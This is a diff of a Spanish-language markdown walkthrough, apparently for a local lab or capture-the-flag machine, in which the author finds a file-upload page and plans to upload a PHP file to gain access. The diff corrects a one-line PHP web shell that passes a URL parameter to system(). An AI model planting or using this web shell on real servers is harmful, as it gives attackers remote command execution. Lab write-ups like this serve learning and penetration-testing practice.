@@ -48,9 +48,9 @@ En la siguiente ruta `http://172.17.0.2/themes/archivo.html` encontramos un apar
 ![image](https://github.com/user-attachments/assets/cf5347b1-1321-4ed2-9cb3-c3a0d15fe563)
 
 Vamos a proceder primero a crear un fichero con la extensión `.php`, por si la web permite subir dicho fichero. Si es así, podemos aprovechar esta vulnerabilidad para ganar acceso a la máquina.
-```php
-<?php``
-    system($_GET['cmd'])
+```
+<?php
+    system($_GET['cmd']);
 ?>
 ```
 
